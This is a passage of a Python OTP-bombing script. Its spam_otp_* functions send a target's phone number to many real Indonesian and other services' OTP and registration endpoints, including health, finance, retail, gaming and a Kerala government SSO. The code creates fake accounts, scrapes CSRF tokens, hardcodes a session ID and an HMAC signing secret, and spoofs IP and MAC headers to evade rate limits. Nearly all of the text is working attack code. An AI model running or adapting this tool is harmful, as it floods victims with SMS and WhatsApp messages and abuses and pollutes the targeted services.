            "origin": "http://www.belanjoonline.com"
        }
        data = {
            "nama_lengkap": random_name,
            "no_telepon": mobile,
            "wilayah": "- Pilih Wilayah -",
            "alamat_lengkap": random_address,
            "username": random_username,
            "password": random_password
        }
        
        resp = requests.post(url, data=data, headers=headers, timeout=910)
        response_text = resp.text.lower()
        
        # Cek sukses
        if resp.status_code == 200:
            if "success" in response_text or "berhasil" in response_text or "pendaftaran" in response_text:
                return True
            return True  # Force success
        
        return False
        
    except:
        return False

def spam_otp_alphamind(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format: 812xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        if raw.startswith('0'):
            raw = raw[1:]
        
        # Format internasional +62
        international_phone = '+62' + raw
        
        # Random name
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        random_name = f"User{random_str}{random.randint(10, 999)}"
        
        # PHPSESSID hardcode
        phpsessid = '9o1be4rov0knu7q5r85us8okan'
        
        url = "https://www.alphamindpower.net/user/actions/send-register-otp-action.php"
        headers = {
            "Accept": "*/*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://www.alphamindpower.net",
            "Referer": "https://www.alphamindpower.net/user/register-otp.php",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Cookie": f"PHPSESSID={phpsessid}"
        }
        payload = {
            "name": random_name,
            "phone": international_phone
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=910)
        result = resp.json()
        
        # Cek sukses
        if result.get("success") == True:
            return True
        
        return False
        
    except:
        return False

def spam_otp_halodoc(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format: +628xxx
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = '62' + raw[1:]
        elif not raw.startswith('62'):
            raw = '62' + raw
        
        formatted_phone = f"+{raw}"
        
        url = "https://customers.api.halodoc.com/alor-api/v1/users/authentication/otp/requests"
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        payload = {
            "phone_number": formatted_phone,
            "channel": "whatsapp"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=910)
        
        # Cek sukses
        if resp.status_code == 200 or resp.status_code == 201:
            return True
        
        if resp.status_code == 429:
            return True  # Rate limit tapi OTP tetap terkirim
        
        try:
            data = resp.json()
            if data.get("status") == "success" or data.get("code") == 200:
                return True
            if data.get("message") and "OTP" in data["message"]:
                return True
        except:
            pass
        
        # Force success kalo response 2xx
        if resp.status_code < 300:
            return True
        
        return False
        
    except:
        return False

def spam_otp_babamarket(nomor):
    try:
        import re
        import requests
        import json
        import hashlib
        import hmac
        from datetime import datetime, timezone
        
        # ========== FORMAT NOMOR ==========
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            mobile = '0' + raw[2:]
        elif not raw.startswith('0'):
            mobile = '0' + raw
        else:
            mobile = raw
        
        print(f"🔹 Format nomor: {mobile}")
        
        # ========== HMAC SIGNATURE ==========
        secret_key = 'e75a6cd43a16c2f31d1a3c17700af64d3658a380c49d65b20cc75b1f7c0e001b'
        timestamp = datetime.now(timezone.utc).isoformat()
        
        signature = hmac.new(
            secret_key.encode(),
            timestamp.encode(),
            hashlib.sha256
        ).hexdigest()
        
        # ========== SESSION ==========
        session = requests.Session()
        
        # STEP 1: Ambil cookie
        home_url = "https://babamarket.co.id/"
        home_headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        session.get(home_url, headers=home_headers, timeout=60)
        
        # STEP 2: Kirim OTP
        url = "https://dev.babamarket.co.id/v2/auth/otp/request"
        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://babamarket.co.id",
            "referer": "https://babamarket.co.id/",
            "x-baba-signature": signature,
            "x-baba-timestamp": timestamp,
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        payload = {
            "type": "phone",
            "phone": mobile,
            "is_register": True
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        result = resp.json()
        
        # ========== CEK RESPONSE ==========
        if result.get("success") == True:
            print(f"✅ OTP terkirim! {result.get('message', '')}")
            return True
        
        if "OTP berhasil dikirim" in result.get("message", ""):
            print(f"✅ OTP terkirim! {result.get('message')}")
            return True
        
        print(f"❌ Gagal: {result.get('message', 'Unknown error')}")
        return False
        
    except Exception as e:
        print(f"❌ Error: {e}")
        return False
        
def spam_otp_plushmiles(nomor):
    try:
        import re
        import requests
        import json
        
        # Clean phone to +628 format (sama kayak JS)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            formatted_phone = '+62' + raw[1:]
        elif raw.startswith('62'):
            formatted_phone = '+' + raw
        elif raw.startswith('+62'):
            formatted_phone = raw
        else:
            formatted_phone = '+62' + raw
        
        print(f"🔹 Nomor diformat: {formatted_phone}")
        
        # Session buat handle cookie
        session = requests.Session()
        
        # STEP 1: GET halaman utama buat dapetin cookie
        print("🔹 STEP 1: GET halaman utama (ambil cookie)")
        url_get = "https://www.plushmiles.com/otp"
        headers_get = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.google.com/",
            "sec-ch-ua": '"Google Chrome";v="147", "Not?A_Brand";v="99", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"
        }
        
        resp_get = session.get(url_get, headers=headers_get, timeout=60)
        print(f"✅ Cookie setelah GET: {len(session.cookies.get_dict())} cookies")
        
        # STEP 2: POST kirim OTP
        print("🔹 STEP 2: POST /api/otp/send")
        url_post = "https://www.plushmiles.com/api/otp/send"
        
        headers_post = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://www.plushmiles.com",
            "referer": "https://www.plushmiles.com/otp",
            "sec-ch-ua": '"Google Chrome";v="147", "Not?A_Brand";v="99", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"
        }
        
        payload = {
            "phone": formatted_phone
        }
        
        resp_otp = session.post(url_post, json=payload, headers=headers_post, timeout=60)
        print(f"✅ Response Status: {resp_otp.status_code}")
        print(f"✅ Response Text: {resp_otp.text}")
        
        # Parse response
        if resp_otp.status_code == 200:
            try:
                data = resp_otp.json()
                print(f"📦 Parsed Response:")
                print(f"   ├─ message: {data.get('message', 'N/A')}")
                print(f"   ├─ primary_channel: {data.get('primary_channel', 'N/A')}")
                print(f"   └─ full: {json.dumps(data, indent=2)}")
                
                if data.get('message') == 'OTP sent successfully' or data.get('primary_channel') == 'whatsapp':
                    print(f"✅ OTP terkirim via {data.get('primary_channel', 'unknown')} ke {formatted_phone}")
                    return True
                else:
                    print(f"❌ Gagal: {data.get('message', 'Unknown error')}")
                    return False
            except json.JSONDecodeError:
                print(f"⚠️ Response bukan JSON: {resp_otp.text}")
                return False
        else:
            print(f"❌ HTTP Error: {resp_otp.status_code}")
            print(f"   └─ Response: {resp_otp.text}")
            return False
        
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False
        
def spam_otp_memzo_wa(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format: 8xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        if raw.startswith('0'):
            raw = raw[1:]
        
        # Buat session
        session = requests.Session()
        
        # STEP 1: Ambil cookie dari halaman login
        login_url = "https://live.memzo.ai/app/login"
        login_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        session.get(login_url, headers=login_headers, timeout=910)
        
        # Generate random data
        random_name = ''.join(random.choices(string.ascii_lowercase, k=6))
        random_email = f"{random_name}{random.randint(1000, 9999)}@gmail.com"
        random_password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        
        # STEP 2: Kirim WA OTP
        url = "https://live.memzo.ai/adminapp/src/controllers/login_signup_send_otp.php"
        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://live.memzo.ai",
            "referer": "https://live.memzo.ai/app/login",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        data = {
            "contact": raw,
            "country_code": "62",
            "name": f"yAh {random_name}",
            "email": random_email,
            "password": random_password,
            "is_wp": "1",
            "otp_channel": "whatsapp",
            "is_reset": "1",
            "token_available": "0",
            "captcha_token": ""
        }
        
        resp = session.post(url, data=data, headers=headers, timeout=910)
        result = resp.json()
        
        # Tampilkan response
        print(f"[MEMZO WA] Response: {json.dumps(result, indent=2)}")
        
        # Cek sukses (error false)
        if result.get("error") == False:
            return True
        
        # Force success kalo status 200
        if resp.status_code == 200:
            return True
        
        return False
        
    except Exception as e:
        print(f"[MEMZO WA] Error: {e}")
        return False

def spam_otp_norkaroots(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format: 8xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        if raw.startswith('0'):
            raw = raw[1:]
        
        # Buat session
        session = requests.Session()
        
        # STEP 1: Ambil CSRF token dari halaman register
        register_url = "https://sso.norkaroots.kerala.gov.in/register"
        register_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        register_resp = session.get(register_url, headers=register_headers, timeout=910)
        
        # Ambil CSRF token dari meta tag
        csrf_token = ""
        match = re.search(r'name="csrf-token"\s+content="([^"]+)"', register_resp.text)
        if match:
            csrf_token = match.group(1)
        
        # Kalo ga dapet, cari di input hidden
        if not csrf_token:
            match = re.search(r'name="_token"\s+value="([^"]+)"', register_resp.text)
            if match:
                csrf_token = match.group(1)
        
        # Kalo masih ga dapet, pake token dari curl
        if not csrf_token:
            csrf_token = "vmDlv7OlzezOH2tipUzTtyHpxYQ1V1hDJTv9OitO"
        
        # STEP 2: Kirim WhatsApp OTP
        otp_url = "https://sso.norkaroots.kerala.gov.in/send-whatsapp-otp"
        otp_headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://sso.norkaroots.kerala.gov.in",
            "referer": "https://sso.norkaroots.kerala.gov.in/register",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": csrf_token,
            "x-requested-with": "XMLHttpRequest"
        }
        otp_data = {
            "whatsapp_number": raw,
            "whatsapp_country_code": "62",
            "whatsapp_country_iso_code": "id"
        }
        
        otp_resp = session.post(otp_url, data=otp_data, headers=otp_headers, timeout=910)
        result = otp_resp.json()
        
        # Tampilkan response
        print(f"[NORKAROOTS] Response: {json.dumps(result, indent=2)}")
        
        # Cek sukses (ada message)
        if result.get("message") and "sent successfully" in result["message"]:
            return True
        
        # Force success kalo status 200
        if otp_resp.status_code == 200:
            return True
        
        return False
        
    except Exception as e:
        print(f"[NORKAROOTS] Error: {e}")
        return False

def spam_otp_cashenable(nomor):
    try:
        import re
        import requests
        import json
        import uuid
        import time
        
        # Format: +628xxx
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            formatted_phone = '+62' + raw[1:]
        elif raw.startswith('62'):
            formatted_phone = '+' + raw
        else:
            formatted_phone = '+62' + raw
        
        # Generate device_id
        device_id = str(uuid.uuid4())
        
        # Traceparent ID
        trace_id = "00000000000000004e90e38523b1af87"
        parent_id = "42bb1cdf1189e3b6"
        
        url = "https://api.cashenable.com/authentication/v2/coreauth"
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "no-cache, no-store, must-revalidate, max-age=0",
            "content-type": "application/json",
            "device_id": device_id,
            "device_name": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "device_type": "desktop",
            "expires": "0",
            "origin": "https://desktop.labamu.co.id",
            "pragma": "no-cache",
            "referer": "https://desktop.labamu.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "source": "Desktop",
            "traceparent": f"00-{trace_id}-{parent_id}-01",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-datadog-origin": "rum",
            "x-datadog-parent-id": "4808468771545670582",
            "x-datadog-sampling-priority": "1",
            "x-datadog-trace-id": "5661274892573716359"
        }
        payload = {
            "identifier": formatted_phone,
            "auth_method": "whatsapp"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=910)
        result = resp.json()
        
        # Tampilkan response
        print(f"[CASHENABLE] Response: {json.dumps(result, indent=2)}")
        
        # Cek sukses (message OK dan require_otp true)
        if result.get("message") == "OK" and result.get("require_otp") == True:
            return True
        
        # Force success kalo status 200
        if resp.status_code == 200:
            return True
        
        return False
        
    except Exception as e:
        print(f"[CASHENABLE] Error: {e}")
        return False

def spam_otp_edufund(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format: 628xxx
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            mobile = '62' + raw[1:]
        elif raw.startswith('+62'):
            mobile = raw[1:]
        elif not raw.startswith('62'):
            mobile = '62' + raw
        else:
            mobile = raw
        
        # Generate random data
        final_name = "hanaa"
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        random_email = f"{final_name.lower()}{random.randint(1000, 99999)}@gmail.com"
        random_password = f"Pass{random_str}@123"
        
        # Buat session
        session = requests.Session()
        
        # Headers dasar
        base_headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://edufund.co.id",
            "referer": "https://edufund.co.id/register",
            "sec-ch-ua": '"Google Chrome";v="147", "Not?A_Brand";v="99", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"
        }
        
        # STEP 1: Ambil CSRF token
        csrf_url = "https://edufund.co.id/api/auth/csrf"
        csrf_resp = session.get(csrf_url, headers=base_headers, timeout=10)
        
        # Ambil csrf_token dari cookie
        csrf_token = ""
        for cookie in session.cookies:
            if cookie.name == "__Host-next-auth.csrf-token":
                csrf_token = cookie.value.split('%7C')[0]
                break
        
        # Kalo ga dapet dari cookie, coba dari response
        if not csrf_token:
            try:
                csrf_data = csrf_resp.json()
                csrf_token = csrf_data.get("csrfToken", "")
            except:
                pass
        
        print(f"[EDUFUND] CSRF Token: {csrf_token[:30]}...")
        
        # STEP 2: Register via GraphQL
        register_url = "https://graphql.edufund.co.id/v1/graphql"
        register_headers = base_headers.copy()
        register_headers["x-csrf-token"] = csrf_token
        
        register_query = {
            "query": f"""mutation {{
                registerBorrower(data: {{
                    name: "{final_name}",
                    email: "{random_email}",
                    password: "{random_password}",
                    password_confirmation: "{random_password}",
                    handphone: "{mobile}",
                    whatsapp_number: "{mobile}",
                    referral_code: "",
                    id_card_number: "",
                    id_card_image: "",
                    referrer_param: "",
                    account_type: "Personal"
                }}) {{
                    account {{
                        id
                        account_id
                        name
                        email
                        handphone
                        account_type
                    }}
                    token
                    refresh_token
                }}
            }}"""
        }
        
        register_resp = session.post(register_url, json=register_query, headers=register_headers, timeout=10)
        register_result = register_resp.json()
        
        # Ambil token dari response
        bearer_token = register_result.get("data", {}).get("registerBorrower", {}).get("token", "")
        user_id = register_result.get("data", {}).get("registerBorrower", {}).get("account", {}).get("id", "")
        
        if not bearer_token:
            print(f"[EDUFUND] Register Response: {json.dumps(register_result, indent=2)}")
            return False
        
        print(f"[EDUFUND] Register success! User ID: {user_id}")
        print(f"[EDUFUND] Bearer Token: {bearer_token[:50]}...")
        
        # STEP 3: Request OTP via GraphQL
        otp_query = {
            "query": """mutation {
                requestOtp(data: { provider: "wa" }) {
                    error
                    message
                }
            }"""
        }
        
        otp_headers = base_headers.copy()
        otp_headers["authorization"] = f"Bearer {bearer_token}"
        otp_headers["x-csrf-token"] = csrf_token
        
        otp_resp = session.post(register_url, json=otp_query, headers=otp_headers, timeout=10)
        otp_result = otp_resp.json()
        
        # Tampilkan response
        print(f"[EDUFUND] OTP Response: {json.dumps(otp_result, indent=2)}")
        
        # Cek sukses
        otp_data = otp_result.get("data", {}).get("requestOtp", {})
        if otp_data.get("error") == False:
            return True
        
        if "OTP sent" in str(otp_data.get("message", "")):
            return True
        
        if "success" in str(otp_data.get("message", "")).lower():
            return True
        
        # Force success kalo status 200
        if otp_resp.status_code == 200:
            return True
        
        return False
        
    except Exception as e:
        print(f"[EDUFUND] Error: {e}")
        return False

def spam_otp_duniagames_sms(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import uuid
        from fake_useragent import UserAgent
        
        # Format nomor: +62xxx
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = '+' + raw
        elif raw.startswith('0'):
            formatted_phone = '+62' + raw[1:]
        else:
            formatted_phone = '+62' + raw
        
        # Generate spoof IP (X-Forwarded-For)
        spoof_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        
        # Generate spoof MAC address
        spoof_mac = ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])
        
        # Generate random device ID
        device_id = str(uuid.uuid4())
        
        ua = UserAgent()
        session = requests.Session()
        
        # Headers dengan spoof IP dan MAC
        headers = {
            "authority": "api.duniagames.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "id",
            "ciam-type": "FR",
            "content-type": "application/json",
            "origin": "https://duniagames.co.id",
            "referer": "https://duniagames.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": ua.random,
            "x-device": device_id,
            "x-forwarded-for": spoof_ip,
            "x-mac-address": spoof_mac,
            "x-real-ip": spoof_ip,
            "x-client-ip": spoof_ip
        }
        
        # Payload
        payload = {
            "phoneNumber": formatted_phone,
            "userName": re.sub(r'\D', '', nomor)
        }
        
        print("🔹 SEND OTP DUNIAGAMES (SMS)")
        print(f"📱 Nomor: {formatted_phone}")
        print(f"🖥️ Spoof IP: {spoof_ip}")
        print(f"🔗 Spoof MAC: {spoof_mac}")
        print(f"📱 Device ID: {device_id}")
        
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        resp = session.post(url, json=payload, headers=headers, timeout=60)
        
        print(f"✅ Status: {resp.status_code}")
        print(f"✅ Response: {resp.text}")
        
        # Parse response
        try:
            data = resp.json()
            if data.get("status", {}).get("code") == 0:
                print("✅ OTP SMS terkirim!")
                auth_id = data.get("data", {}).get("authId", "")
                if auth_id:
                    print(f"🔑 AuthID: {auth_id[:50]}...")
                return True
            else:
                print(f"⚠️ Error: {data.get('status', {}).get('message', 'Unknown error')}")
                return False
        except:
            print("⚠️ Response bukan JSON")
            return False
            
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_subzero(nomor):
    try:
        import re
        import requests
        
        # Format nomor: 62 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            phone = '62' + raw[1:]
        elif raw.startswith('62'):
            phone = raw
        else:
            phone = '62' + raw
        
        session = requests.Session()
        
        url = f"https://pair.subzero.gleeze.com/code?number={phone}"
        
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://pair.subzero.gleeze.com/pair",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(url, headers=headers, timeout=60)
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('code'):
                return True, result['code']
        
        return False, None
        
    except Exception as e:
        return False, None

def spam_otp_bundasemarang(nomor):
    try:
        import re
        import requests
        from bs4 import BeautifulSoup
        import time
        
        # Format nomor: 0 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            phone = raw
        else:
            phone = '0' + raw
        
        session = requests.Session()
        session.verify = False  # Matikan verify buat HTTP
        requests.packages.urllib3.disable_warnings()  # Matikan warning
        
        # STEP 1: GET login page - ambil cookie & token
        print("🔹 STEP 1: GET /login (ambil cookie & token)")
        login_url = "http://pendaftaran.bundasemarang.co.id/pendaftaran-online/login"
        login_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.google.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(login_url, headers=login_headers, timeout=60)
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # Ambil _token dari input hidden id='a'
        soup = BeautifulSoup(resp.text, 'html.parser')
        token_input = soup.find('input', {'id': 'a'})
        
        if not token_input:
            # Fallback: cari name='_token'
            token_input = soup.find('input', {'name': '_token'})
        
        if not token_input:
            print("❌ Token tidak ditemukan di HTML")
            print(f"Preview HTML: {resp.text[:500]}")
            return False
        
        token = token_input.get('value')
        print(f"✅ Token: {token}")
        
        # STEP 2: POST /reqOTP - kirim OTP
        print("🔹 STEP 2: POST /reqOTP")
        otp_url = "http://pendaftaran.bundasemarang.co.id/pendaftaran-online/reqOTP"
        otp_headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "http://pendaftaran.bundasemarang.co.id",
            "referer": "http://pendaftaran.bundasemarang.co.id/pendaftaran-online/login",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        otp_data = {
            "_token": token,
            "nohp": phone
        }
        
        print(f"📱 Mengirim OTP ke: {phone}")
        resp = session.post(otp_url, data=otp_data, headers=otp_headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('success') == True:
                print(f"✅ SUKSES! {result.get('message')}")
                return True
            else:
                print(f"❌ GAGAL: {result.get('message')}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        import traceback
        traceback.print_exc()
        return False

def spam_otp_somethinc(nomor):
    try:
        import re
        import requests
        import random
        import string
        import time
        from bs4 import BeautifulSoup
        
        # Format nomor: 81274307931 (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        phone = raw
        
        session = requests.Session()
        
        # STEP 0: GET login page - ambil CSRF token dari meta
        print("🔹 STEP 0: GET /login (ambil CSRF dari meta)")
        login_url = "https://www.somethinc.com/en/account/login"
        login_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.google.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(login_url, headers=login_headers, timeout=60)
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # Ambil CSRF token dari meta tag
        soup = BeautifulSoup(resp.text, 'html.parser')
        csrf_meta = soup.find('meta', {'name': 'csrf-token'})
        
        if not csrf_meta:
            # Coba cari di <input hidden>
            csrf_input = soup.find('input', {'name': '_token'})
            if csrf_input:
                csrf_token = csrf_input.get('value')
            else:
                print("❌ CSRF token tidak ditemukan di HTML")
                return False
        else:
            csrf_token = csrf_meta.get('content')
        
        print(f"✅ CSRF Token dari meta: {csrf_token}")
        
        # Generate random data
        first_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@gmail.com"
        password = "Hahaha666"
        
        # STEP 1: Register - pake CSRF token
        print("🔹 STEP 1: POST /register-preverify")
        register_url = "https://www.somethinc.com/ajax/register-preverify"
        
        boundary = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        register_headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": f"multipart/form-data; boundary={boundary}",
            "origin": "https://www.somethinc.com",
            "referer": "https://www.somethinc.com/en/account/login",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": csrf_token,
            "x-requested-with": "XMLHttpRequest"
        }
        
        register_data = f"""--{boundary}
Content-Disposition: form-data; name="first_name"

{first_name}
--{boundary}
Content-Disposition: form-data; name="email"

{email}
--{boundary}
Content-Disposition: form-data; name="phone"

{phone}
--{boundary}
Content-Disposition: form-data; name="phone_code"

62
--{boundary}
Content-Disposition: form-data; name="country_id"

100
--{boundary}
Content-Disposition: form-data; name="password"

{password}
--{boundary}
Content-Disposition: form-data; name="password_confirmation"

{password}
--{boundary}
Content-Disposition: form-data; name="agree_terms"

1
--{boundary}
Content-Disposition: form-data; name="subscribe"

1
--{boundary}--
"""
        
        register_resp = session.post(register_url, headers=register_headers, data=register_data, timeout=60)
        print(f"✅ Register Response: {register_resp.text[:200]}...")
        
        if register_resp.status_code != 200:
            print("❌ Register gagal")
            return False
        
